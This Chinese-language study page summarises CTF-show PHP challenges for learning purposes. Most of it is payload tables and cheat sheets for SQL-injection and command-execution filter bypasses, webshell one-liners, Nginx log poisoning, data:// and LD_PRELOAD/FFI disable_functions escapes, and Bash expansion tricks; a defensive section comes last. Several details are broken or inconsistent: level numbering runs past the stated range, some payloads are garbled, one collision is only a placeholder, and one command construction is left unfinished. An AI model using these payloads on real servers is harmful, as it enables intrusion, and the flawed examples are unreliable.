---
title: CTF-show PHP 命令执行漏洞利用与绕过技术全景实战总结
description: 系统梳理 CTF-show 平台 Web 入门关卡（第 1-8 关 SQL 注入绕过）及命令执行关卡（第 9-23 关）的核心绕过技术，涵盖进制转换、字节操作、运算符构造、正则绕过、函数替代、Base64
  编码、assert/短标签闭合、一句话木马、MD5 碰撞、Nginx 日志投毒、无字母数字 RCE、disable_functions/open_basedir
  绕过及 Bash 内置变量展开等完整攻击链，构建 PHP Web 攻防知识体系。
category: program-analysis
tags:
- CTF
- PHP
- Command Execution
- SQL Injection
- Bypass Techniques
- CTF-show
- Web Security
- RCE
- Pseudo Protocols
- Bash Variable Expansion
- Disable Functions Bypass
- WAF Bypass
date: 2024-12-19
updated: '2026-11-14'
---
## 概述

本页面整合无名安全团队微信公众号归档文章《CTFshow 萌新题》（作者：火之高兴）及《CTF-show命令代码执行实践》（作者：N1vRANA），系统复盘 CTF-show 平台 **Web 入门系列（第 1-8 关，SQL 注入绕过）** 与 **Web 命令执行系列（第 9-23 关）** 的核心利用思路。内容覆盖从基础 `intval` 绕过、正则过滤对抗、进制/编码转换，到命令注入、文件包含伪协议、变量函数调用、异或构造、无字母数字 RCE、沙箱逃逸、内存马植入的完整技术栈，适合 CTF 选手、渗透测试工程师及 PHP 安全研究者构建结构化知识库。

> **交叉引用**：PHP Webshell 基础原理与蚁剑流量分析见 [[php-webshell-fundamentals-chopper-analysis]]；多态混淆免杀技术见 [[php-webshell-obfuscation-av-evasion]]；条件竞争在文件上传/包含中的利用见 [[race-condition-vulnerability-analysis]]。

---

## 一、Web 入门系列：SQL 注入与类型转换绕过（第 1-8 关）

此阶段核心考点为 `intval()` 特性与正则过滤绕过，目标均为构造 `id=1000` 绕过 `intval($id) > 999` 判断。

### 核心函数特性

| 函数 | 行为 | 利用要点 |
|------|------|----------|
| `intval($str)` | 从字符串开头解析数字，遇非数字停止；非数字开头返回 0 | 字符串 `'1000'`、`'1000abc'` 均返回 1000；SQL 中 `'1000'` 等同 `1000` |
| `preg_match()` | 正则匹配，默认大小写不敏感（`i` 修饰符） | 黑名单过滤易被编码、拼接、进制转换绕过 |

### 关卡绕过技术谱系

#### 进制转换绕过（WEB-7 核心解法）
| 进制 | Payload 示例 | 说明 |
|------|--------------|------|
| 二进制 | `id=0b1111101000` | PHP 原生支持 `0b` 前缀 |
| 八进制 | `id=01750` | PHP 原生支持 `0` 前缀 |
| 十六进制 | `id=0x3e8` | PHP 原生支持 `0x` 前缀；需注意 SQL 语境下 `0x3e8` 会被当作十六进制字符串，配合 `intval` 仍可工作 |

#### 字节位运算构造
| 运算 | Payload 示例 | 原理 |
|------|--------------|------|
| 双重取反 | `id=~~1000` | `~` 按位取反，两次还原；WEB-6 过滤 `~` 后失效 |
| 异或运算 | `id=200^800` | `^` 按位异或，任意结果为 1000 的数对均可；WEB-6 过滤 `^` 后失效 |
| 按位或 | `id=992|8` | `|` 按位或，结果为 1000 |
| 取反绕过数字过滤 | `id=~0` → `-1` | 结合其他运算构造数字 |

#### 算术运算符构造
| 运算 | Payload 示例 | 注意 |
|------|--------------|------|
| 乘法 | `id=200*5` | |
| 除法 | `id=10/0.01` | 浮点数运算 |
| 减法 | `id=2000-1000` | |
| 一元负号 | `id=--1000` | 双重负号即正号 |
| 加法 | `id=200+800` | URL 中 `+` 需编码为 `%2b` 或 `%20` |

#### 字符串与编码绕过（WEB-1 至 WEB-5 核心）
| 技巧 | Payload 示例 | 适用场景 |
|------|--------------|----------|
| 字符串数字 | `id='1000'` | `intval` 解析为 1000，SQL 视为字符串 `'1000'` 隐式转换 |
| 括号包裹 | `id=(1000)` | 绕过简单正则 |
| 科学计数法 | `id=1e3` | `intval('1e3')` 返回 1，不可用；但 `1e3` 在 SQL 中为 1000，视 `intval` 实现而定 |
| 连续编码 | `id=%31%30%30%30` | 双重 URL 编码绕过 WAF 解码 |

#### SQL 注入向量（非预期解）
| 向量 | Payload 示例 | 条件 |
|------|--------------|------|
| 恒真条件 | `id=1 or 1=1#` | 过滤 `or`、`#` 需编码或大小写绕过 |
| 注释截断 | `id=1000#` | MySQL 注释符 `#` 需 URL 编码 `%23` |

### 正则过滤演进对抗表（WEB-1 至 WEB-7）

| 关卡 | 过滤正则关键增量 | 失效 Payload | 生效 Payload |
|------|------------------|--------------|--------------|
| 1 | 无（仅过滤 `flag` 关键词） | - | `'1000'` |
| 2 | `/or|\+/i` | `1 or 1=1` | `'1000'`, `~~1000` |
| 3 | `/-|\\|\*|<|>|!|x|hex/` | `2000-1000` | `200^800`, `~~1000` |
| 4 | `/select/i` | - | 同 3 |
| 5 | `/'|"|\|/` | `'1000'`, `200^800` | `~~1000` |
| 6 | `/\^/` | `200^800` | `~~1000` |
| 7 | `/~/` | `~~1000` | `0b1111101000` (二进制) |

> **总结**：WEB-1 至 WEB-7 核心在于理解 `intval` 与 SQL 隐式转换差异，以及黑名单正则的天然不完备性。实战中推荐**白名单校验**或**参数化查询**防御。

---

## 二、核心函数与执行载体（命令执行篇）

| 函数 / 结构 | 执行方式 | 典型关卡 |
|-------------|----------|----------|
| `system()` / `exec()` / `shell_exec()` / `passthru()` / `popen()` | 直接命令执行 | 9-12, 16-18, 22 |
| `` `cmd` `` (反引号) | 等价于 `shell_exec()` | 9, 11 |
| `eval()` | PHP 代码执行 | 9-15, 22 |
| `include` / `require` / `include_once` / `require_once` | 文件包含 → 代码执行 | 17, 22 |
| `assert()` / `preg_replace('/e')` / `call_user_func()` | 回调型代码执行 | 13, 22 |
| `highlight_file()` / `show_source()` | 文件源码泄露 | 22 |

---

## 三、命令执行系列：正则绕过与技术演进（第 9-23 关）

### 基础命令注入与函数替代（关卡 9-11）

| 关卡 | 过滤点 | 核心 Payload | 技术要点 |
|------|--------|--------------|----------|
| 9 | 仅允许 `system` `exec` `highlight` | `c=system('ls');` `c=system('cat config.php');` | 白名单机制，直接使用允许函数 |
| 10 | 禁用 `system` `exec` `highlight` | `c=passthru('cat config.php');` | **函数替代**：`passthru`、`shell_exec`、`popen`、`proc_open`、`pcntl_exec`、`backticks` |
| 11 | 追加禁用 `cat` | `c=system('tac config.php');` `c=system('ca""t config.php');` | **同类命令替代**：`tac`、`more`、`less`、`head`、`tail`、`nl`、`sed`、`awk`、`strings`、`od`；**引号打断关键字** |

> **技巧汇总（贯穿 9-18 关）**：
> - **空格替代**：`${IFS}`、`$IFS$1`、`$IFS$9`、`%09`(Tab)、`%20`、`{cat,flag.php}` (Brace Expansion)
> - **重定向读文件**：`<flag.php`、`<>flag.php`、`cat<flag.php`
> - **通配符路径**：`fla?*`、`fl[a-z]*`、`/???/fla?.php`
> - **命令拼接**：`a=g;cat$IFS$1fla$a.php`、`` `nl fl''ag.php` ``

### 关键字过滤与编码绕过（关卡 12）

**过滤**：`system` `exec` `highlight` `cat` `.` `php` `config`

| 绕过向量 | Payload 示例 | 核心原理 |
|----------|--------------|----------|
| **Base64 编码 + 动态解码** | `c=$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');system($b);` | `base64_decode` 还原命令字符串，变量名任意 |
| **反引号命令替换** | `c=passthru("ca''t 'ls'");` | 反引号内命令优先执行，结果作为参数 |
| **变量函数拼接** | `c=$a='sy'.'stem';$a('cat config.php');` | 字符串拼接绕过关键字匹配 |

### 符号过滤与闭合绕过（关卡 13-15）

| 关卡 | 过滤增量 | 核心突破 | Payload 示例 |
|------|----------|----------|--------------|
| 13 | `;` `.` `file` | **`assert` 无分号执行** + **短标签闭合 `?>`** | `c=assert(base64_decode('c3lzdGVtKCJjYXQgY29uZmlnLnBocCIp'))?>` |
| 14 | `(` | **中括号调用 / 一句话木马** | `c=echo '$\_POST[1]';?>` → POST `1=cat config.php` |
| 15 | `>` | **短标签 `<?=` 直接输出** | `c=echo '$\_POST[1]';?>` (同 14) |

> **`assert()` 特性**：参数为字符串时按 PHP 代码执行，**不需要分号结尾**，配合 `?>` 闭合当前 PHP 标签完美绕过分号过滤。
> **短标签 `<?= ?>`**：等同 `<?php echo ?>`，绕过 `php` 关键字过滤（见关卡 10 伪协议利用）。

### MD5 碰撞与弱类型比较（关卡 16）

**代码**：`if(md5("ctfshow$c")==="a6f57ae38a22448c2f07f3f95f49c84e")`

**解法**：MD5 碰撞爆破 / 弱类型比较绕过（此处为全等 `===`，需真碰撞）。
- 使用工具 `md5coll`、`hashclash` 或在线彩虹表查找 `ctfshow` + `?` 的碰撞字符串。
- 文章示例直接给出碰撞值（需实测）：`c=<collision_string>`

### 文件包含与 Nginx 日志投毒（关卡 17）

**过滤**：仅过滤 `php` 关键字，`include($c)` 可控。

**攻击链**：
1.  **确定中间件**：响应头 `Server: nginx` → 日志路径 `/var/log/nginx/access.log` `/var/log/nginx/error.log`
2.  **日志投毒**：发送恶意 User-Agent/Referer/X-Forwarded-For 写入 PHP 代码
    ```http
    GET / HTTP/1.1
    User-Agent: <?php eval($_POST['x']);?>
    ```
3.  **包含日志执行**：`c=/var/log/nginx/access.log`
4.  **连接蚁剑/菜刀** 或手动执行 `system('cat /flag36.php');`

> **扩展**：`session` 文件包含、`php://filter` 读源码、`phar://` 反序列化均可结合文件包含利用。见 [[php-webshell-obfuscation-av-evasion]] 中伪协议利用篇。

### 变量函数与数组指针绕过（关卡 18 - 对应原文第 11 关逻辑）

**场景**：极严格过滤（数字、字母、常见符号均过滤），仅允许极少字符。

**核心链**：
```php
eval(array_pop(next(get_defined_vars())));
// GET 参数：?1=system("tac fla?.php");
```
1. `get_defined_vars()` 返回当前作用域变量数组（含 `$_GET`、`$_POST`、`_SERVER` 等）
2. `next()` 移动指针至第二个元素（通常为 `$_GET`）
3. `array_pop()` 取出该数组（即 `$_GET`）
4. `eval()` 执行 `$_GET[1]` 内容

> **延伸**：`current()`/`end()`/`prev()`/`reset()` 配合 `array_shift`/`array_pop` 实现无字母数字代码执行基础原语。

### 异或构造无字母数字 RCE（关卡 19 - 对应原文第 12 关逻辑）

**过滤**：数字、小写字母、`` ` `` `+` `~` `$` `[` `]` `{` `}` `&` `-`

**原理**：PHP 字符串异或 `"A" ^ "="` 可生成任意字符。枚举两个**非受限字符**异或得到目标字符（如 `s` `y` `s` `t` `e` `m`），拼接为函数名并动态调用。

**自动化生成器核心逻辑**：
```php
$allowed = array_diff(range(0,255), array_map('ord', str_split('0123456789abcdefghijklmnopqrstuvwxyz`+~$[]{}&-')));
foreach($allowed as $i) foreach($allowed as $j)
    if ((chr($i) ^ chr($j)) === 's') $pairs['s'][] = [$i,$j];
```
**Payload 形态**：
```php
("~"^"@")("~"^"@"...")(); // 通过异或生成 "system" 并调用
```
> **同源技术**：[[php-webshell-obfuscation-av-evasion]] “Stage 2 XOR-splits characteristic functions”即此思路工程化实现。

### 操作符、重定向与少见命令（关卡 20-23 对应原文 13-18）

| 关卡 | 过滤点 | 核心技术 | Payload 示例 |
|------|--------|----------|--------------|
| 20 | 无回显 | **布尔盲注 / 时间盲注** 思路；`||` `&&` 短路执行 | `c=sleep(1)||ls` |
| 21 | `;` `cat` | **`&&` 连接符** (URL 编码 `%26%26`) | `c=ls%26%26tac flag.php` |
| 22 | `;` `空格` `cat` | **Tab `%09` / `${IFS}` 替代空格** | `c=ls%09||%09tac%09flag.php` |
| 23 | 综合 | **输入重定向 `<` + `||` 短路** | `c=nl<flag.php||ls` |
| 24 | `cat` | **`mv` 重命名 + `||`** | `c=mv flag.php 1.txt||ls` (需 `%7C%7C`) |
| 25 | `tac` `空格` | **双引号打断 + `${IFS}`** | `c=ta"c${IFS}fla?.php` |

### 无字母数字文件上传 RCE（关卡 26-28 对应原文 19-21）

**场景**：前端上传 + 后端 `eval` 执行文件名/内容，过滤极严。

| 关卡 | 核心突破 | 关键技术 |
|------|----------|----------|
| 26 | 通配符 `?` `[@-[]` 匹配大写 | 爆破路径 `c=.+/???/????????[@-[]`；上传内容 `cat flag.php` |
| 27 | 利用 `$_` `$?` 等特殊变量 | Bash 变量展开生成字符，写入并执行 |
| 28 | 过滤数字 → 取反/位运算构造 | `${_}` 获取 PID 等非数字特征值，配合 `~` 位运算构造数字 |

**实战自动化模式**：
```python
import requests
while True:
    r = requests.post(url, params={'c': payload}, files={'file': ('1.php', 'cat flag.php')})
    if 'flag' in r.text: break
```

---

## 四、进阶：禁用函数与沙箱逃逸（关卡 29 对应原文 22）

### 信息收集
```php
phpinfo(); // 重点：disable_functions、open_basedir、extension_dir、session.save_path
```

### 绕过向量矩阵

| 向量 | 适用条件 | 核心代码 / 步骤 |
|------|----------|-----------------|
| **伪协议包含** | `include`/`require` 未禁用 | `include('php://filter/read=convert.base64-encode/resource=flag.php')`<br>`include('data://text/plain,<?php system("cat /flag");?>')` |
| **日志包含** | 写权限 + 已知日志路径 | 1. UA 投毒 `<?php eval($_POST[x]);?>`<br>2. `include('/var/log/apache2/access.log')` |
| **highlight_file / show_source** | 函数未禁用 | `highlight_file('flag.php')` 直接回显源码 |
| **Session 文件包含** | `session.save_handler=files` 可控 `session_id` | `session_id('<?php system("cmd");?>'); session_start(); include('/var/lib/php/sess_...')` |
| **LD_PRELOAD 劫持** | `putenv`/`mail`/`imap`/`error_log`/`ld` 未禁用 | 1. 编译恶意 `.so` (构造函数执行 `system`)<br>2. 上传至 `/tmp/evil.so`<br>3. `putenv('LD_PRELOAD=/tmp/evil.so'); mail('a','b','c');` 触发 |
| **PCNTL 执行** | `pcntl_exec` 未禁用 | `pcntl_exec('/bin/bash', ['-c', 'cat /flag']);` |
| **FFI (PHP 7.4+)** | `ffi.enable=true` | `FFI::cdef('int system(const char *);')->system('cat /flag');` |
| **Imagick/Ghostscript 委托** | 扩展加载 + 委托配置可控 | CVE-2019-10101 等委托链 RCE |
| **open_basedir 绕过** | `open_basedir` 限制目录 | `DirectoryIterator('glob:///*')` 遍历、`chdir()` 突破、`ini_set('open_basedir','..')` 相对路径逃逸、错误日志竞争 |
| **UAF/GC 内存利用 (PHP 7.x)** | 无禁用函数但内存保护弱 | 完整利用链：泄露二进制基址 → 解析 ELF → 定位 `zif_system` → 伪造对象劫持控制流 → `system('cat /flag')`<br>**关键类**：`Vuln`(析构触发)、`Helper`(指针读写)、`Exception`(回溯栈地址) |
| **PDO / MySQL UDF** | `pdo_mysql` + `LOAD_FILE` 权限 | `new PDO(...); $dbh->query('select load_file("/flag")');` |

---

## 五、极限环境：Bash 内置变量展开绕过（关卡 30 对应原文 23）

**场景**：`system()` 执行，过滤**所有字母、数字、常见符号、环境变量名 (PATH/HOME/BASH/PWD 等)**，长度 ≤ 65。

### 核心语法速查

| 语法 | 含义 | 示例产出 |
|------|------|----------|
| `${var:~N}` | 取变量 `var` 最后 N 位 | `${PATH:~0}` → `n` (PATH 以 `bin` 结尾) |
| `${#var}` | 变量值长度 | `${#SHLVL}` → `1` (默认 SHLVL=1) |
| `${var:offset:length}` | 子串切片 | `${PWD:${#SHLVL}}` → 从第 1 字符开始取 |
| `$?` | 上一命令返回码 | 成功 `0`，失败非 `0` |
| `${##}` / `${#?}` | 长度为 1 的数字构造 | 替代 `${#SHLVL}` |

### 字符拼接构造命令实战

**目标**：构造 `cat flag.php` 或 `rev<<<...` 等命令。

**可用变量**：`PWD`(当前目录)、`USER`、`HOSTNAME`、`HOME`、`OLDPWD`、`SHELL`、`_` 等**未被过滤**的环境变量（需实测）。

**典型字符获取片段**：
```bash
# 获取 '/' (PWD 首字符)
${PWD::${#SHLVL}}          # 或 ${PWD:${#?}} (若 $?=0)

# 获取 't' (HOME 第 13 字符，假设 HOSTNAME 长度为 12)
${HOME:${#HOSTNAME}:${#SHLVL}}

# 获取 'c' (USER 最后一位)
${USER:~0}   # ~0 等同 ~A，取最后一位

# 获取 'a' (PWD 第 2 字符)
${PWD:${#SHLVL}:${#SHLVL}}

# 获取 ' ' 空格 (通过 $IFS 或特定变量切片)
${IFS}   # 若 IFS 未被过滤
```

**组合示例（构造 `cat flag.php`）**：
```bash
# 假设 PWD=/var/www/html, HOME=/root, USER=www-data, HOSTNAME=ctfshow
# c = ${PWD::1}  -> /
# a = ${PWD:1:1} -> v (不稳定)，改用其他变量
# t = ${HOME:${#HOSTNAME}:1}
# 空格 = ${IFS} 或 $' '
# f = 通配符 ? 或从其他变量切片
# l = 通配符 ?
# a = ...
# g = ...
# . = 通配符 ?
# p = ...
# h = ...
# p = ...
```
实际需**多次刷新**稳定 `$?`，配合 `rev` 反转、通配符 `?` `*` 补全文件名。

### 进阶过滤应对策略

| 额外过滤 | 应对策略 |
|----------|----------|
| 过滤 `PWD` `SHLVL` `HOME` `HOSTNAME` `USER` | 寻找未过滤变量 (`_`、`OLDPWD`、`SHELL`、`TERM`、`LANG` 等) 或利用 `${##}`/`${#?}` 构造数字 |
| 过滤 `#` `?` `~` | 利用 `${!var}` 间接引用 (变量名动态构造)、命令替换 `$()`(若未过滤)、算术扩展 `$(( ))` |
| 过滤 `_` | 利用 `$0` (脚本名)、`$$` (PID)、`$!` (后台进程 PID)、`$@`/`$*` (参数列表) |

---

## 六、知识图谱与交叉引用

```mermaid
graph TD
  A[CTF-show Web 全景] --> B[入门 SQLi 1-8]
  A --> C[命令执行 9-23]
  B --> B1[intval 特性]
  B --> B2[进制转换]
  B --> B3[位运算/算术构造]
  B --> B4[正则黑名单对抗]
  C --> D[基础注入 9-11]
  C --> E[编码/闭合绕过 12-15]
  C --> F[MD5碰撞 16]
  C --> G[文件包含/日志投毒 17]
  C --> H[变量/数组/异或 18-19]
  C --> I[操作符/重定向/少见命令 20-25]
  C --> J[无字母数字上传 26-28]
  C --> K[禁用函数/沙箱逃逸 29]
  C --> L[Bash变量展开极限 30]

  G --> G1[php://filter]
  G --> G2[data://]
  G --> G3[短标签 <?= ?>]
  G --> G4[Nginx/Apache 日志投毒]
  K --> K1[LD_PRELOAD/FFI/PCNTL]
  K --> K2[UAF 内存利用]
  K --> K3[open_basedir 绕过]
  K --> K4[Imagick/Ghostscript]
  L --> L1[${var:~N} 尾部切片]
  L --> L2[${#var} 长度取数]
  L --> L3[rev + 通配符 补全]
```

**相关页面**：
- PHP Webshell 核心原理与流量分析 → [[php-webshell-fundamentals-chopper-analysis]]
- PHP 多态混淆免杀工程化实现 → [[php-webshell-obfuscation-av-evasion]]
- 条件竞争在文件上传/包含中的利用 → [[race-condition-vulnerability-analysis]]
- VulnHub 实战中命令执行链复现 → [[vulnhub-bbs-cute-102-writeup]]、[[vulnhub-chronos-writeup]]、[[vulnhub-darkhole2-writeup]]

---

## 七、速查表：高频绕过 Payload 模板

| 场景 | Payload 模板 | 关键点 |
|------|--------------|--------|
| **SQLi: 字符串数字** | `id='1000'` | `intval` 解析 1000，SQL 隐式转换 |
| **SQLi: 进制转换** | `id=0b1111101000` `id=0x3e8` | PHP 原生支持 |
| **SQLi: 双重取反** | `id=~~1000` | 绕过数字/运算符过滤 |
| **SQLi: 异或构造** | `id=200^800` | 任意结果为 1000 的数对 |
| **空格绕过** | `${IFS}` `$IFS$1` `$IFS$9` `%09` `%20` `{cmd,arg}` | Bash 内置变量 / Brace Expansion |
| **关键字打断** | `ca"t"` `ca't'` `c\at` `ca${IFS}t` | 引号/转义/变量拼接 |
| **通配符读文件** | `cat fla?.php` `cat fla*` `cat fl[a-z]*` `cat /???/fla?.php` | Shell 路径展开 |
| **重定向读文件** | `cat<flag.php` `cat<>flag.php` `nl<flag.php` | 输入重定向 |
| **命令连接** | `cmd1;cmd2` `cmd1%0acmd2` `cmd1%26%26cmd2` `cmd1||cmd2` | `;` `\n` `&&` `||` |
| **伪协议包含(读)** | `include('php://filter/read=convert.base64-encode/resource=flag.php')` | 读源码 |
| **伪协议包含(执行)** | `include('data://text/plain,<?php system("cmd");?>')` | 直接 RCE |
| **短标签执行** | `include('data://text/plain,<?=system("cmd");?>')` | 绕过 `php` 过滤 |
| **assert 无分号** | `assert(base64_decode('...'))?>` | 配合 `?>` 闭合 |
| **一句话木马** | `echo '$\_POST[1]';?>` → POST `1=system('cmd')` | 绕过括号/分号过滤 |
| **异或构造函数名** | `("~"^"@")("~"^"@"...")()` | 无字母数字 RCE |
| **数组指针取值** | `eval(array_pop(next(get_defined_vars())));` | 无字母数字 eval |
| **Bash 尾部切片** | `${PATH:~0}` → `n` `${HOME:~0}` → `e` | 构造命令首字符 |
| **Bash 长度取数** | `${#SHLVL}` → `1` `${#?}` → `1` `${##}` → `1` | 切片偏移量 |
| **间接变量引用** | `${!var}` | 变量名动态构造 |
| **LD_PRELOAD 劫持** | `putenv('LD_PRELOAD=/tmp/evil.so'); mail('a','b','c');` | 需 `putenv`/`mail` 未禁用 |
| **FFI 执行** | `FFI::cdef('int system(const char *);')->system('cmd');` | PHP 7.4+ `ffi.enable=true` |

---

## 八、实战建议与防御视角

1.  **代码审计重点**：搜索 `system/exec/shell_exec/passthru/popen/proc_open/eval/assert/include/require/pcntl_exec/putenv/mail/ld/ffi` 等危险函数，检查用户输入是否直接拼接。
2.  **禁用函数配置**：
    ```ini
    disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec,putenv,mail,imap_open,ld,dl,error_log,syslog,ftp_connect,ftp_login,ftp_exec,ftp_raw,highlight_file,show_source,assert,preg_replace,call_user_func,call_user_func_array,array_map,array_filter,array_walk,create_function,eval,assert,include,require,include_once,require_once,file_get_contents,file_put_contents,fopen,fwrite,fsockopen,pfsockopen,stream_socket_client,stream_socket_server,stream_context_create,pcntl_fork,pcntl_signal,pcntl_alarm,pcntl_wait,pcntl_waitpid,pcntl_getpriority,pcntl_setpriority,pcntl_exec,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_signal_dispatch,pcntl_async_signals,pcntl_unshare
    ```
3.  **open_basedir 限制**：`open_basedir = /var/www/html:/tmp:/var/lib/php/sessions` 限制文件操作范围，防止 `glob://`、`DirectoryIterator` 遍历敏感目录。
4.  **输入过滤策略**：
    - **白名单校验**（命令参数、文件路径、ID 数值）
    - 避免黑名单正则（易被编码/拼接/变量/进制绕过）
    - 使用 `escapeshellarg()`/`escapeshellcmd()` 配合参数化执行（如 `exec('cat ' . escapeshellarg($file))`）
    - SQL 必须使用**参数化查询**（Prepared Statements），见 [[java-preparedstatement-sql-injection-defense]] 原理通用。
5.  **日志与监控**：
    - 记录 `system` 类函数调用参数、文件包含路径、异常 `eval` 代码
    - 结合 RASP/WAF 检测：异或操作频次、异常字符分布、超长参数、Base64 高熵字符串、短标签 `<?=` 出现
    - 审计 Nginx/Apache 访问日志中的 User-Agent/Referer 注入特征
6.  **最小权限原则**：
    - Web 进程以低权限用户运行（`www-data`/`nginx`），禁用 `proc_open`、`pcntl_fork` 等进程控制
    - 限制 `/proc` `/sys` `/dev` 访问，挂载 `noexec` `nosuid` `nodev`
    - 禁用 PHP 不必要扩展（`ffi`、`imagick`、`ghostscript`、`ldap` 等）
7.  **容器化隔离**：以只读根文件系统运行容器，挂载临时卷至 `/tmp` `/var/www/html/runtime`，网络策略限制出站连接。

---

## 九、参考资源

- 原文归档 1：[CTFshow 萌新题 (WEB 1-17)](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247486955&idx=2&sn=101388cf4b481b2bd14a667340132180)
- 原文归档 2：[CTF-show命令代码执行实践 (WEB 9-23)](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247487060&idx=1&sn=2b17d19b05fc5f3dbb4b88f387166587)
- PHP 伪协议官方文档：`php://`、`data://`、`phar://`、`glob://`、`zip://`、`compress.zlib://`
- Bash 参数展开手册：`man bash` → *Parameter Expansion* 小节
- PHP 内存利用（UAF/GC）研究：`php7-gc-bypass`、`php7-uaf-exploit` 等公开 PoC
- CTF-show 官方平台：<https://ctf.show/>
- 《Web 安全攻防实战》相关章节

## 来源

- [0x00实验室-202108-202304_057](../sources/0x00实验室-202108-202304_057.md)
- [0x00实验室-202108-202304_059](../sources/0x00实验室-202108-202304_059.md)
